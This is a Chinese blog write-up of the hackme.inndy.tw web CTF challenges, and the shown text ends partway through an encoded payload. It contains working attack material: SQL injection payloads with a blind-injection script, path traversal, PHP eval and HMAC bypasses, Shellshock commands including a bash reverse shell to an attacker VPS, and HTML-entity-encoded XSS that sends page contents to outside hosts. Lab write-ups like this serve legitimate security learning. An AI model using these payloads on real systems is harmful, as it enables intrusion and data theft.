","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"hackme-web题解","slug":"hackme-1","date":"2020-09-13T13:44:24.000Z","updated":"2020-09-13T13:44:24.084Z","comments":true,"path":"2020/09/13/hackme-1/","link":"","permalink":"http://chaosec.top/2020/09/13/hackme-1/","excerpt":"历史文章补发 前言 最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址https://hackme.inndy.tw/","text":"历史文章补发 前言 最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址https://hackme.inndy.tw/ LFI 查看源代码 尝试读取 1https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;flag Can you read the flag&lt;?php require(‘config.php’); ?&gt;? 读取config即可得到flag 1https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;config homepage 查看代码在结尾看到一个cute.js，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可 ping 命令执行，我们可以使用 $() 或者 都可以实现执行命令的作用 1https://hackme.inndy.tw/ping/?ip=$(ls -a) 然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试 1https://hackme.inndy.tw/ping/?ip=$(tac *.*) scoreboard f12查看点击网络，查看一下消息头即可看到flag login as admin 0 题目主要源码如下 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phprequire('config.php');// table schema// user -&gt; id, user, password, is_adminif($_GET['show_source'] === '1') &#123; highlight_file(__FILE__); exit;&#125;function safe_filter($str)&#123; $strl = strtolower($str); if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') || strstr($strl, 'update') || strstr($strl, 'delete') ) &#123; return ''; &#125; return str_replace(\"'\", \"\\\\'\", $str);&#125;$_POST = array_map(safe_filter, $_POST);$user = null;// connect to databaseif(!empty($_POST['name']) &amp;&amp; !empty($_POST['password'])) &#123; $connection_string = sprintf('mysql:host=%s;dbname=%s;charset=utf8mb4', DB_HOST, DB_NAME); $db = new PDO($connection_string, DB_USER, DB_PASS); $sql = sprintf(\"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'\", $_POST['name'], $_POST['password'] ); try &#123; $query = $db-&gt;query($sql); if($query) &#123; $user = $query-&gt;fetchObject(); &#125; else &#123; $user = false; &#125; &#125; catch(Exception $e) &#123; $user = false; &#125;&#125;?&gt; 本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下 1234567891011function safe_filter($str)&#123; $strl = strtolower($str); if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') || strstr($strl, 'update') || strstr($strl, 'delete') ) &#123; return ''; &#125; return str_replace(\"'\", \"\\\\\\\\'\", $str);&#125;$_ 可以看到，题目过滤了 or 1=1 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下 1name&#x3D;guest\\&#39; or user&#x3D;0x61646d696e-- +&amp;password&#x3D;guest login as admin 0.1 上个题目的加强版，直接union注入即可，最终payload如下 1name&#x3D;guest\\&#39; union select 1,the_f14g,3,3 from h1dden_f14g-- +&amp;password&#x3D;123465 login as admin 1 题目过滤并不严格，payload如下 1admin\\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1# login as admin 1.2 上一题的加强版，需要进行盲注，代码如下 123456789101112131415161718192021222324import requestsurl = \"https://hackme.inndy.tw/login1/index.php\"length = 1flag = \"\"# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#\"# database:login_as_admin1# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#\"# tables: 0bdb54c98123f5526ccaed982d2006a9,users# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#\"# id,4a391a11cfa831ca740cf8d00782f3a6payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#\" data = &#123;'name':r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#\", 'password':\"123\"&#125;for i in range(0,70): for j in range(32,128): data['name'] = payload1.format(str(length),str(j)) content = requests.post(url,data=data).text if \"FLAG\" in content: flag += chr(j) print('**flag:**',flag) length += 1 break login as admin 3 题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 != ，这就存在弱比较的漏洞 123456789101112131415161718function load_user()&#123; global $secret, $error; if(empty($_COOKIE['user'])) &#123; return null; &#125; $unserialized = json_decode(base64_decode($_COOKIE['user']), true); $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']; if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) &#123; $error = 'Invalid session'; return false; &#125; $data = json_decode($unserialized['data'], true); return [ 'name' =&gt; $data[0], 'admin' =&gt; $data[1] ];&#125; 我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证 那么我们构造一个cookie 123456789101112&lt;?php function set_user()&#123; global $user, $secret; $user = ['admin', true]; $data = json_encode($user); $sig = 0; $all = base64_encode(json_encode(['sig' =&gt; $sig, 'data' =&gt; $data])); return $all;&#125;echo set_user();?&gt; 然后刷新即可 login as admin 4 题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可 1curl -d \"name=admin\" https://hackme.inndy.tw/login4/ Login as Admin 6 1234567891011if(!empty($_POST['data'])) &#123; try &#123; $data = json_decode($_POST['data'], true); &#125; catch (Exception $e) &#123; $data = []; &#125; extract($data); if($users[$username] &amp;&amp; strcmp($users[$username], $password) == 0) &#123; $user = $username; &#125;&#125; 看代码可知存在变量覆盖漏洞，构造json数据即可 1data=&#123;\"users\":&#123;\"admin\":\"snow\"&#125;,\"username\":\"admin\",\"password\":\"snow\"&#125; login as admin 7 md5弱比较 dafuq-manager 1 查看cookie可以发现 show_hidden 字段为 no，改为yes刷新即可得到flag dafuq-manager 2 这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag 推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分 1234case \"admin\": require \"./core/fun_admin.php\"; show_admin($GLOBALS[\"dir\"]); break; 我们跟进fun_admin.php 1234567891011121314151617181920212223242526272829function show_admin($dir) &#123; $pwd = (($GLOBALS[\"permissions\"] &amp; 2) == 2); $admin = (($GLOBALS[\"permissions\"] &amp; 4) == 4); if (!$GLOBALS[\"require_login\"]) show_error($GLOBALS[\"error_msg\"][\"miscnofunc\"]); if (isset($GLOBALS['__GET'][\"action2\"])) $action2 = $GLOBALS['__GET'][\"action2\"]; elseif (isset($GLOBALS['__POST'][\"action2\"])) $action2 = $GLOBALS['__POST'][\"action2\"]; else $action2 = \"\"; switch ($action2) &#123; case \"chpwd\": if (!$pwd) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); changepwd($dir); break; case \"adduser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); adduser($dir); break; case \"edituser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); edituser($dir); break; case \"rmuser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); removeuser($dir); break; default: if (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); admin($admin, $dir); &#125;&#125; 主要的限制条件在于 12$pwd = (($GLOBALS[\"permissions\"] &amp; 2) == 2);$admin = (($GLOBALS[\"permissions\"] &amp; 4) == 4); 我们跟进这个变量看一下 123456789101112function activate_user($user, $pass) &#123; $data = find_user($user, $pass); if ($data == NULL) return false; $GLOBALS['__SESSION'][\"s_user\"] = $data[0]; $GLOBALS['__SESSION'][\"s_pass\"] = $data[1]; $GLOBALS[\"home_dir\"] = $data[2]; $GLOBALS[\"home_url\"] = $data[3]; $GLOBALS[\"show_hidden\"] = $data[4]; $GLOBALS[\"no_access\"] = $data[5]; $GLOBALS[\"permissions\"] = $data[6]; return true;&#125; 再定位到find_user() 1234567891011function &amp;find_user($user, $pass) &#123; $cnt = count($GLOBALS[\"users\"]); for ($i = 0;$i &lt; $cnt;++$i) &#123; if ($user == $GLOBALS[\"users\"][$i][0]) &#123; if ($pass == NULL || ($pass == $GLOBALS[\"users\"][$i][1] &amp;&amp; $GLOBALS[\"users\"][$i][7])) &#123; return $GLOBALS[\"users\"][$i]; &#125; &#125; &#125; return NULL;&#125; 可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量 123$GLOBALS[\"users\"] = array( array(\"guest\", \"084e0343a0486ff05530df6c705c8bb4\", \"./data/guest\", \"https://game1.security.ntu.st/data/guest\", 0, \"^.ht\", 1, 1),); 但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数 在fun_down.php文件中可以找到一个readfile()函数 1234567891011121314151617181920212223242526&lt;?phprequire_once ('core/secure.php');function download_item($dir, $item) &#123; $item = basename($item); if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $abs_item = get_abs_item($dir, $item); if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $browser = id_browser(); header('Content-Type: ' . (($browser == 'IE' || $browser == 'OPERA') ? 'application/octetstream' : 'application/octet-stream')); header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT'); header('Content-Transfer-Encoding: binary'); header('Content-Length: ' . filesize($abs_item)); if ($browser == 'IE') &#123; header('Content-Disposition: attachment; filename=\"' . $item . '\"'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Pragma: public'); &#125; else &#123; header('Content-Disposition: attachment; filename=\"' . $item . '\"'); header('Cache-Control: no-cache, must-revalidate'); header('Pragma: no-cache'); &#125; @readfile($abs_item); exit;&#125; 题目过滤部分如下 12345if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $abs_item = get_abs_item($dir, $item); if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); 我们要读取的是 .config/.htusers.php ，但是在题目的 stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;) 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中 12345678910111213141516171819function edit_file($dir, $item) &#123; if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $fname = get_abs_item($dir, $item); if (!file_in_web($fname)) show_error($GLOBALS[\"error_msg\"][\"accessfile\"]); if (isset($GLOBALS['__POST'][\"dosave\"]) &amp;&amp; $GLOBALS['__POST'][\"dosave\"] == \"yes\") &#123; $item = basename(stripslashes($GLOBALS['__POST'][\"fname\"])); $fname2 = get_abs_item($dir, $item); if (!isset($item) || $item == \"\") show_error($GLOBALS[\"error_msg\"][\"miscnoname\"]); if ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"itemdoesexist\"]); savefile($dir, $fname2); $fname = $fname2; &#125; $fp = @fopen($fname, \"r\"); if ($fp === false) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"openfile\"]); $s_item = get_rel_item($dir, $item); if (strlen($s_item) &gt; 50) $s_item = \"...\" . substr($s_item, -47); show_header($GLOBALS[\"messages\"][\"actedit\"] . \": /\" . $s_item); 函数中有三条过滤 123if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); 第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下 123456789101112131415161718function get_show_item($dir, $item) &#123; if ($item == \".\" || $item == \"..\") return false; if ($_COOKIE['help'] == 'me') &#123; $_COOKIE['help'] = null; setcookie('help', '', time() - 9999999999); echo '&lt;script&gt;alert(\"Very good. You know how to create cookie. How about tamper a cookie?\")&lt;/script&gt;'; &#125; if (empty($_COOKIE['show_hidden'])) &#123; setcookie('show_hidden', 'no', time() + 3600); &#125; if (substr($item, 0, 1) == \".\" &amp;&amp; $GLOBALS[\"show_hidden\"] == false &amp;&amp; $_COOKIE['show_hidden'] != 'yes') return false; if ($GLOBALS[\"no_access\"] != \"\" &amp;&amp; @eregi($GLOBALS[\"no_access\"], $item)) return false; if ($GLOBALS[\"show_hidden\"] == false) &#123; $dirs = explode(\"/\", $dir); foreach ($dirs as $i) if (substr($i, 0, 1) == \".\") return false; &#125; return true;&#125; 题目仅仅对$item进行了简单的过滤， if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false; ，那么我们可以考虑用目录穿越 ../../ 绕过 那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes） 1https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;edit&amp;item&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;webhdisk&#x2F;.config&#x2F;.htusers.php&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en 于是可以读到目标文件 然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 how do you turn this on ，登录即可读取flag dafuq-manager 3 题目给出了信息 For flag3, you need a shell to get that. see $WEBROOT/flag3! 这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 eval ，在fun_debug.php中发现存在该函数，跟进一下 1234567891011121314151617181920function do_debug() &#123; assert(strlen($GLOBALS['secret_key']) &gt; 40); $dir = $GLOBALS['__GET']['dir']; if (strcmp($dir, \"magically\") || strcmp($dir, \"hacker\") || strcmp($dir, \"admin\")) &#123; show_error('You are not hacky enough :('); &#125; list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2); $cmd = base64_decode($cmd); $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',); foreach ($bad_things as $bad) &#123; if (stristr($cmd, $bad)) &#123; die('2bad'); &#125; &#125; if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]), $hmac)) &#123; die(eval($cmd)); &#125; else &#123; show_error('What does the fox say?'); &#125;&#125; 对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数 1234function make_command($cmd) &#123; $hmac = hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]); return sprintf('%s.%s', base64_encode($cmd), $hmac);&#125; 所以我们可以自己生成command 1234567&lt;?php function make_command($cmd) &#123; $hmac = hash_hmac('sha256', $cmd, \"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3\"); return sprintf('%s.%s', base64_encode($cmd), $hmac);&#125;var_dump(make_command('$a=\\'sys\\';$b=\\'tem\\';$c=$a.$b;$c(base64_decode(\\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\\'));'));?&gt; 注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下 1https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;debug&amp;dir[]&#x3D;admin&amp;command&#x3D;JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en 做完后感觉自己好菜呀，这代码审计的我晕头转向，233333… wordpress 1 WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 wp-content/plugins/core.php 中发现了一段代码 1234567891011function print_f14g()&#123; $h = 'm'.sprintf('%s%d','d',-4+9e0); if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') &#123; if(wp_get_user_ip() === '127.0.0.1') &#123; eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT))); &#125; else &#123; die('&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'); &#125; &#125;&#125; 我们把代码中的md5解密一下发现是 cat flag，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问 1https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;?passw0rd&#x3D;cat%20flag 查看元素即可找到flag wordpress 2 随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句 1&lt;!-- debug:&lt;?php var_dump($wp_query-&gt;post-&gt;&#123;'post_'.(string)($_GET['debug']?:'type')&#125;); ?&gt; --&gt; 看到query，应该是在搜索页面，所以我们提交的payload应该为 1https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;archives&#x2F;date&#x2F;2013&#x2F;10?s&#x3D;&amp;debug&#x3D;content command-executor 随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件 1https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index base64解码一下得到源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php$pages = [ ['man', 'Man'], ['untar', 'Tar Tester'], ['cmd', 'Cmd Exec'], ['ls', 'List files'],];function fuck($msg) &#123; header('Content-Type: text/plain'); echo $msg; exit;&#125;$black_list = [ '\\/flag', '\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;'];function waf($a) &#123; global $black_list; if(is_array($a)) &#123; foreach($a as $key =&gt; $val) &#123; waf($key); waf($val); &#125; &#125; else &#123; foreach($black_list as $b) &#123; if(preg_match(\"/$b/\", $a) === 1) &#123; fuck(\"$b detected! exit now.\"); &#125; &#125; &#125;&#125;waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell='bash') &#123; system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));&#125;foreach($_SERVER as $key =&gt; $val) &#123; if(substr($key, 0, 5) === 'HTTP_') &#123; putenv(\"$key=$val\"); &#125;&#125;$page = '';if(isset($_GET['func'])) &#123; $page = $_GET['func']; if(strstr($page, '..') !== false) &#123; $page = ''; &#125;&#125;if($page &amp;&amp; strlen($page) &gt; 0) &#123; try &#123; include(\"$page.php\"); &#125; catch (Exception $e) &#123; &#125;&#125;?&gt; 题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 CVE-2014-6271(破壳（shellsock）漏洞) ，在freebuf中有一个链接 http://www.freebuf.com/articles/system/45390.html 国外有一个漏洞利用的文章， https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php 但是直接利用会被waf掉，所以我们要考虑绕过正则 1&#39;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&#39; 题目的正则中 :; 是存在漏洞的，我们可以用 : ; 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 \\/flag 我们可以利用通配符绕过， 1wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot; 但是并没有出现flag，发现是因为只有root才有文件的读权限 但是题目中有一个flag-reader文件，我们尝试读取一下 1wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot; 123456789101112131415161718192021222324252627282930313233include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char buff[4096], rnd[16], val[16]; if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123; write(1, \"Not enough random\\n\", 18); &#125; setuid(1337); seteuid(1337); alarm(1); write(1, &amp;rnd, sizeof(rnd)); read(0, &amp;val, sizeof(val)); if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123; int fd = open(argv[1], O_RDONLY); if(fd &gt; 0) &#123; int s = read(fd, buff, 1024); if(s &gt; 0) &#123; write(1, buff, s); &#125; close(fd); &#125; else &#123; write(1, \"Can not open file\\n\", 18); &#125; &#125; else &#123; write(1, \"Wrong response\\n\", 16); &#125;&#125; 代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell 1wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps_ip&#x2F;8888 0&gt;&amp;1&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot; 又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag 1flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content 1cat content xssme 先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下 1&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt; 回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做 然后在自己的ceve账号中收到回显 xssrf leak 上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显 Admin only allowed from localhost, but you came from 192.168.123.1 修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法 1&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ov0eg5.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt; 但是遭到了过滤，我们可以考虑用HTML实体编码绕过 1&lt;svg&#x2F;onload&#x3D;&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;&quot;&gt; 果然可以收到payload，base64解码一下再保存为html格式打开 send request功能有个request.php，尝试读取该页面 123456789101112&lt;svg&#x2F;onload&#x3D;&quot;xmlhttp&#x3D;new XMLHttpRequest();xmlhttp.onreadystatechange&#x3D;function()&#123; if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200) &#123; document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; 编码一下 1&lt;svg&#x2F;onload&#x3D;&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114